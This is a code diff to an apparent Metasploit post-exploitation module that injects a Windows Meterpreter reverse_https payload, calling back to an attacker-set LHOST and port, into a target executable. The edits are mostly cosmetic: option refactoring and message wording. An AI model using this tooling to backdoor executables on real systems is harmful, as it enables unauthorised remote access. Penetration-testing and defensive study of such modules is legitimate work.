@@ -18,13 +18,13 @@ class MetasploitModule < Msf::Post
            ))
 
     register_options(
-        [
-            OptString.new('PAYLOAD',   [false, 'Windows Payload to inject into the targer executable.', "windows/meterpreter/reverse_https"]),
-            OptAddress.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
-            OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),
-            OptString.new('TARGETPE',   [false, 'Path of the target executable to be injected']),
-            OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format."])
-        ]
+      [
+        Opt::LHOST,
+        Opt::LPORT(4433),
+        OptString.new('PAYLOAD',   [false, 'Windows payload to inject into the target executable', 'windows/meterpreter/reverse_https']),
+        OptPath.new('TARGETPE',   [false, 'Path of the target executable to be injected']),
+        OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format"])
+      ]
     )
   end
 
@@ -36,8 +36,8 @@ class MetasploitModule < Msf::Post
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
 
     # Check that the payload is a Windows one and on the list
-    if not  session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])
-      print_error("The Payload specified #{datastore['PAYLOAD']} is not a valid for this system")
+    unless session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])
+      print_error("The specified payload (#{datastore['PAYLOAD']}) is incompatible with this system")
       return
     end
 
@@ -79,7 +79,7 @@ class MetasploitModule < Msf::Post
   def inject_payload(pay, targetpe)
 
     begin
-      print_status("Generating payload")
+      print_status('Generating payload')
       raw = pay.generate
       param = {}
 
@@ -95,12 +95,12 @@ class MetasploitModule < Msf::Post
       param[:targetpe] = targetpe
       param[:size] = threaded_shellcode.length;
 
-      print_status("Injecting #{pay.name} into the executable #{param[:targetpe]}")
+      print_status("Injecting #{pay.name} into the executable: #{param[:targetpe]}")
       client.peinjector.inject_shellcode(param)
-      print_good("Successfully injected payload into the executable: #{param[:targetpe]}")
+      print_good("Successfully injected the payload into the executable: #{param[:targetpe]}")
 
     rescue ::Exception => e
-      print_error("Failed to Inject Payload to executable #{param[:targetpe]}!")
+      print_error("Failed to inject the payload into the executable: #{param[:targetpe]}!")
       print_error(e.to_s)
     end
   end
